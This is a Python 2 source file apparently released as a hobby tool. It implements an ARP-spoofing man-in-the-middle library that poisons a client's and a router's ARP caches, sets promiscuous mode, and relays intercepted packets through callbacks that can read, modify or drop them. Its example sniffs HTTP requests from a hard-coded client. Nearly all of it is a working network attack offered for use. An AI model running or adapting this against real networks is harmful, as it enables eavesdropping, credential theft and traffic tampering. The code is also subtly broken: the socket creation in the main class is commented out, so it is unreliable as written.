import sys;
import io;
import socket;
import struct;
import threading;
import thread;
import fcntl;
import time;
import select;

# used for example #
import re;
##

##################################################################################
#	Web: http://xpnsbraindump.blogspot.com
#	Email: email.xpn[at]gmail[dot]com
#	IRC: irc.awarenetwork.org #aware
#
#	Created in full by XPN
#
#	Use as you see fit (no mallicious programs tho). Please give me credit where due
#	and let me know how/why it has been used.
#
##################################################################################
#
# This was created out of a curiosity for the intercepting and modifying live traffic I have
# read so much about. When searching for a good tool to allow modification of 
# data streams I fell short... so here we go.
#
# !!! NOT FOR MALLICIOUS USE !!!
#
# This is my first ever python program, so please forgive the usual amateur mistakes
# any improvements/critisism (constructive only please) then let me know.
#
# Usage is pretty simple and an example has been provided at the bottom of the 
# python code.
#
##################################################################################


####################

#
# Used in the following topology:
#
#	[Host] <--> [Router]
#
#	We run this program and the layer 2 layout changes to:
#
#	[Host] <--> [Us] <--> [Router]
#
# It works as follows:
#	we send 2 continuous arp replies
#		one to the Host 
#		one to the router
#
#	each arp contains our MAC address
#	
#	Data is captured by this program by sniffing raw data
#	We can intervene in the stream of data by dropping packets, changing packets etc..
#	
#	The framework allows a callback for specific protocols to a subroutine
#

SIOCGIFFLAGS = 0x8913
SIOCSIFFLAGS = 0x8914

IFF_PROMISC = 0x100

class _arp_mangle (threading.Thread):
	our_addr = "";		# IP Address of this computer
	our_mac = "";		# MAC Address of this computer
	target_addr = "";	# Target Address of the computer we are sending the spoof to
	spoof_addr = "";	# IP Address we are protending to be
	target_mac = "";	# MAC Address of the computer we are sending the spoof to (if known)
	interface = "";		# interface to use 
	arp_pause = 0;		# pause between sending arp replies
	
	_packet_socket = 0;
	
	# control variables

	end_thread = False;	# When set to true, our running thread ends
	thread_lock = 0;	# Lock that is released when our running thread ends

	def __init__(self, interface, our_addr, our_mac, target_addr, spoof_addr, arp_pause=0.5, target_mac=""):
		self.interface = interface;
		self.our_addr = our_addr;
		self.our_mac = our_mac;
		self.target_addr = target_addr;
		self.spoof_addr = spoof_addr;
		self.target_mac = target_mac;
		self.arp_pause = arp_pause;

		self.thread_lock = thread.allocate_lock();

		threading.Thread.__init__(self);

	def init_interface(self):
		try:
			self._packet_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW);
			self._packet_socket.bind((self.interface, 0x0806));
			return;
		except socket.error:
			raise Exception("Could not create Packet Socket");


	def resolve_destination_mac(self):
		packet = "";
		arp_packet = [];

		if self.target_mac == "":
			self.target_mac = self.arp_lookup(self.target_addr);

		return True;

	def arp_lookup(self, target_ip):
		found_arp = 5;		# 5 retries to capture the MAC

		self.send_arp_request(self.our_mac, self.our_addr, target_ip);

		while found_arp > 0:
			ready = select.select([self._packet_socket], [], [], 1);

			if len(ready[0]) == 0:
				# timeout
				return;

			packet = self._packet_socket.recv(1024);

			if len(packet) > 42:
				# disassemble packet
				arp_packet = struct.unpack("6s6sHHHBBH6s4s6s4s", packet[:42]);

				# see if this is an arp reply
				if (socket.htons(arp_packet[7]) == 0x0002):
					# confirms that this is an ARP reply
					# if so, we need to check that we have
					# captured the right target
					if arp_packet[9] == socket.inet_aton(target_ip):
						return arp_packet[1];

			found_arp -= 1;


	def run(self):
		# enter loop now to send arp replies to poison cache

		self.thread_lock.acquire();

		while self.end_thread == False:
			self.send_arp_reply(self.our_mac, self.spoof_addr, self.target_mac, self.target_addr);
			time.sleep(self.arp_pause);

		self.thread_lock.release();

		return;

	def end(self):
		self.end_thread = True;
		self.thread_lock.acquire();			# this will block until the thread quits and releases the lock
		return;

	def send_arp_request(self, src_mac, src_ip, dst_ip):
		packet = "";

		# now we must build our ARP packets 

		packet = "\xff\xff\xff\xff\xff\xff";			# destination mac broadcast
		packet += src_mac;					# source mac address
		packet += struct.pack("H", socket.htons(0x0806));	# ARP type
		packet += struct.pack("H", socket.htons(0x0001));	# Hardware Type: Ethernet
		packet += struct.pack("H", socket.htons(0x0800));	# Protocol Type: IP
		packet += "\x06";					# Hardware size: 6 bytes
		packet += "\x04";					# Protocol size: 4 bytes
		packet += struct.pack("H", socket.htons(0x0001));	# Opcode: request
		packet += src_mac;					# Sender MAC Address
		packet += socket.inet_aton(src_ip);			# Sender IP Address
		packet += "\x00\x00\x00\x00\x00\x00";			# Target MAC Address
		packet += socket.inet_aton(dst_ip);			# Target IP Address

		self._packet_socket.send(packet);

	def send_arp_reply(self, src_mac, src_ip, dst_mac, dst_ip):
		packet = "";

		packet = dst_mac;					# destination mac addr
		packet += src_mac;					# source mac address
		packet += struct.pack("H", socket.htons(0x0806));	# ARP type
		packet += struct.pack("H", socket.htons(0x0001));	# Hardware Type: Ethernet
		packet += struct.pack("H", socket.htons(0x0800));	# Protocol Type: IP
		packet += "\x06";					# Hardware size: 6 bytes
		packet += "\x04";					# Protocol size: 4 bytes
		packet += struct.pack("H", socket.htons(0x0002));	# Opcode: request
		packet += src_mac;					# Sender MAC Address
		packet += socket.inet_aton(src_ip);			# Sender IP Address
		packet += dst_mac;					# Target MAC Address
		packet += socket.inet_aton(dst_ip);			# Target IP Address

		self._packet_socket.send(packet);

TYPE_IP = 0x0800;
PROTO_TCP = 0x06;
PROTO_UDP = 0x11;

class mitm (threading.Thread):
	"""mitm(interface, target_ip, source_ip, our_ip, our_mac);
	Where:
		interface :- (STRING) Interface connected to network (for example "eth0")
		target_ip :- (STRING) IP Address of where we will forward packets to (usually router)
		source_ip :- (STRING) IP Address of where we will receive packets from (usually client pc)
		our_ip :- (STRING) IP Address of this machine (or IP Address of interface on this machine)
		our_mac :- (HEX ESCAPED STRING) MAC address to use for this machine. This does not have to be the actual mac address.
	Example:
		mitm_client = mitm.mitm("eth0", "192.168.0.1", "192.168.0.2", "192.168.0.250", "\x00\x01\x02\x03\x04\x05");
	
	"""
	target_ip = "";		# ip address where we are forwarding packets to (usually router)
	target_mac = "";	# mac address of the host where to are forwarding packets to (router)
	source_ip = "";		# ip address where we are sourcing packets (usually user pc)
	source_mac = "";	# mac address of the host where we are sourcing packets (user pc)
	our_ip = "";		# ip address of this machine (used to resolve the target / source MAC address)
	our_mac = "";		# mac address of this machine (used to insert into arp packets)
	interface = "";		# interface to use for sending ARP packets

	# callback dictionaries can be visualised as {'80': [callback1, callback2], '25': [callback3, callback4]}

	_callbacks_tcp = {};	# dictionary of callbacks for tcp {key is the port name, value is a list element}
	_callbacks_udp = {};	# dictionary of callbacks for ucp {key is the port name, value is a list element}

	_packet_socket = 0;	# our packet socket we use to send and receive traffic

	_mangle_src = 0;	# ARP class to mangle the source (user pc)
	_mangle_dst = 0;	# ARP class to mangle the destination (router)

	_thread_lock = 0;	# Lock for the running thread
	_end_thread = False;	

	def __init__(self, interface, target_ip, source_ip, our_ip, our_mac):
		self.interface = interface;
		self.target_ip = target_ip;
		self.source_ip = source_ip;
		self.our_mac = our_mac;			# used for MAC requests
		self.our_ip = our_ip;			# used for MAC requests

		try:
			# self._packet_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.IPPROTO_IP);
			self._packet_socket.bind((self.interface, 0x0800));

			self._add_promisc(self.interface);

			self._mangle_src = _arp_mangle(interface, our_ip, our_mac, source_ip, target_ip);
			self._mangle_dst = _arp_mangle(interface, our_ip, our_mac, target_ip, source_ip);

			self._thread_lock = thread.allocate_lock();

			threading.Thread.__init__(self);

		except socket.error:
			raise Exception("! Could not create Packet Socket. Please run this program as root, check interface and try again");

	def _add_promisc(self, interface):
		current_flags = 0;

		ifreq = fcntl.ioctl(self._packet_socket, SIOCGIFFLAGS, interface + '\0' * 256);

		(current_flags,) = struct.unpack("16xH", ifreq[:18]);

		current_flags |= IFF_PROMISC;		# update the PROMISC flag

		ifreq = struct.pack("4s12xH", interface, current_flags);
		fcntl.ioctl(self._packet_socket, SIOCSIFFLAGS, ifreq);

		return;

	def _remove_promisc(self, interface):
		current_flags = 0;

		ifreq = fcntl.ioctl(self._packet_socket, SIOCGIFFLAGS, interface + '\0' * 256);

		(current_flags,) = struct.unpack("16xH", ifreq[:18]);

		current_flags ^= IFF_PROMISC;		# remove the PROMISC flag

		ifreq = struct.pack("4s12xH", interface, current_flags);
		fcntl.ioctl(self._packet_socket, SIOCSIFFLAGS, ifreq);

		return;


	def add_tcp_callback(self, callback, port):
		'''add_tcp_callback(callback, port);
		Adds a callback function to be called when a TCP packet is received directed towards speicified port.
		Multiple callbacks can be used for the same port
		Where:
			callback :- Symbol of function to call upon packet being received
			port :- Port this callback will be used on
		Example:
			add_tcp_callback(http_callback, 80);
			add_tcp_callback(http_callback2, 80);
			add_tcp_callback(smtp_callback, 25);
		'''

		port = int(port);

		if self._callbacks_tcp.has_key(port) == True:
			self._callbacks_tcp[port].append(callback);
		else:
			self._callbacks_tcp[port] = [callback];

	def add_udp_callback(self, callback, port):
		'''add_udp_callback(callback, port);
		Adds a callback function to be called when a UDP packet is received directed towards speicified port.
		Multiple callbacks can be used for the same port
		Where:
			callback :- Symbol of function to call upon packet being received
			port :- Port this callback will be used on
		Example:
			add_udp_callback(http_callback, 80);
			add_udp_callback(http_callback2, 80);
			add_udp_callback(smtp_callback, 25);
		'''

		port = int(port);

		if self._callbacks_udp.has_key(port) == True:
			self._callbacks_udp[port].append(callback);
		else:
			self._callbacks_udp[port] = [callback];

	def remove_tcp_callback(self, callback, port):
		''' remove_tcp_callback(callback, port)
		Removes a callback function from the TCP callback table
		Where:
			callback :- Symbol of function to call upon packet being received
			port :- Port this callback will be used on
		Example:
			remove_tcp_callback(http_callback, 80);
		'''

		if self._callbacks_tcp.has_key(port) == True:
			try:
				self._callbacks_tcp[port].remove(callback);
			except ValueError:
				# fails quietly if does not contain specified callback
				return;

	def remove_udp_callback(self, callback, port):
		''' remove_udp_callback(callback, port)
		Removes a callback function from the UDP callback table
		Where:
			callback :- Symbol of function to call upon packet being received
			port :- Port this callback will be used on
		Example:
			remove_udp_callback(http_callback, 80);
		'''
		if self._callbacks_udp.has_key(port) == True:
			try:
				self._callbacks_udp[port].remove(callback);
			except ValueError:
				# fails quietly if does not contain specified callback
				return;

	def _call_callback(self, proto, port, packet):
		# all callbacks called are in first come first served
		# if CALLBACK 1 affects the packet, CALLBACK 2 will see
		# the changes made !

		if proto == "tcp":
			if self._callbacks_tcp.has_key(port) == True:
				for callback in self._callbacks_tcp[port]:
					try:
						packet = callback(packet);
					except:
						print "Exception Caught in Callback routine (TCP port %d)" % (port);
						return packet;

		if proto == "udp":
			if self._callbacks_udp.has_key(port) == True:
				for callback in self._callbacks_udp[port]:
					try:
						packet = callback(packet);
					except:
						print "Exception Caught in Callback routine (UDP port %d)" % (port);
						return packet;

		return packet;

	def run(self):
		''' run()
		Please use 'start()' to begin this thread, calling 'run()' directly will not dispatch a new thread
		Starts the main loop of the program that will receive IP packets and dispatch callback routines
		This will spawn a seperate thread of execution and return instantly. You can also call join on this
		object to block.
		'''

		self._mangle_dst.init_interface();		# exception handled and fall through

		if self._mangle_dst.resolve_destination_mac() != True:
			raise Exception("ARP Lookup Unsuccessfull for IP: {0}".format(self._mangle_dst.target_addr));

		self.target_mac = self._mangle_dst.target_mac;	

		self._mangle_src.init_interface();		# exception handled and fall through
		if self._mangle_src.resolve_destination_mac() != True:
			raise Exception("ARP Lookup Unsuccessfull for IP: {0}".format(self._mangle_src.target_addr));

		self.source_mac = self._mangle_src.target_mac;

		self._mangle_dst.start();		# start thread to mangle the Routers ARP Table
		self._mangle_src.start();		# start thread to mangle the Sources ARP Table

		self._thread_lock.acquire();

		while self._end_thread == False:
			self._sniff();

		self._thread_lock.release();

	def end(self):
		''' end()
		Ends the execution of the running thread
		'''

		self._end_thread = True;
		self._thread_lock.acquire();		# blocks until running thread ends

		self._mangle_dst.end();
		self._mangle_src.end();
		self._remove_promisc(self.interface);
		self._packet_socket.close();

	def _sniff(self):
		ready = select.select([self._packet_socket], [], [], 1)

		if len(ready[0]) == 0:
			return;

		packet = self._packet_socket.recv(9076);

		if len(packet) < 66:
			# means that we are unable to disassemble this packet
			# as missing Ethernet | IP | (TCP|UDP) headers
			# this shouldn't happen as we are bound to receive IP 
			# packets, but best to be safe
			return;

		ethernet_header = struct.unpack("6s6sH", packet[:14]);		# extract ethernet header

		if socket.htons(ethernet_header[2]) != TYPE_IP:
			# pass through as we are only parsing IP packets
			return;

		ip_header = struct.unpack("BBHHHBBH4s4s", packet[14:34]);	# extract ip header

		# here we do checks to make sure we are only capturing the packets from source <-> target

		if ethernet_header[0] == self.our_mac:
			# means we have a packet from source <-> target that has been captured by us
			if ip_header[6] == PROTO_TCP:
				# use TCP callbacks
				tcp_header = struct.unpack("HH", packet[34:38]);
				packet = self._call_callback("tcp", socket.htons(tcp_header[0]), packet); # use source port
				packet = self._call_callback("tcp", socket.htons(tcp_header[1]), packet); # use destination port
			elif ip_header[6] == PROTO_UDP:
				# use UDP callbacks
				udp_header = struct.unpack("HH", packet[34:38]);
				packet = self._call_callback("udp", socket.htons(udp_header[0]), packet); # use source port
				packet = self._call_callback("udp", socket.htons(udp_header[1]), packet); # use destination port
		
			# lastly we send out the callback modified packet
			self._send_packet(packet, ethernet_header[1]);

		return;


	def _send_packet(self, packet, mac_addr):
		# within this, we replace the 'destination mac' with the CORRECT mac address
		# and the 'source mac' as the correct source (us)

		if packet == "":
			# dont bother to send a NULL packet
			return;

		if mac_addr == self.source_mac:
			# means this packet is going to the router
			packet = self.target_mac + self.our_mac + packet[12:];
		elif mac_addr == self.target_mac:
			# menas this packet is going to the client pc
			packet = self.source_mac + self.our_mac + packet[12:];
		else:
			# for neither our client or router, so we don't touch
			return;

		try:
			self._packet_socket.send(packet);		# send the modified packet
		except:
			raise Exception("Error Using Packet Socket to send modified packet");

################ EXAMPLE OF USAGE #######################


def example_http_callback(packet):		# full packet is provided (ethernet, ip, tcp/udp headers inclusive)

	m = re.search("(GET|POST) (.*) HTTP/1.(1|0)\r\n", packet[54:]);

	if m != None:
		print m.group(0); 	# prints all HTTP GET or POST requests

	return packet;			# Please return the packet that you would like to send
					# if empty string is returned, then packet is dropped


if __name__ == "__main__":
	interface = "eth0";
	router_addr = "192.168.2.1";
	client_pc_addr = "192.168.2.109";
	our_addr = "192.168.2.50";
	our_mac = "\x40\x41\x42\x43\x44\x45";

	a = mitm(interface, client_pc_addr, router_addr, our_addr, our_mac);
	a.add_tcp_callback(example_http_callback, 80);

	try:
		a.start();

		while True:
			time.sleep(1);

	except KeyboardInterrupt:
		print "\nCLEANING UP THREADS\n";
		a.end();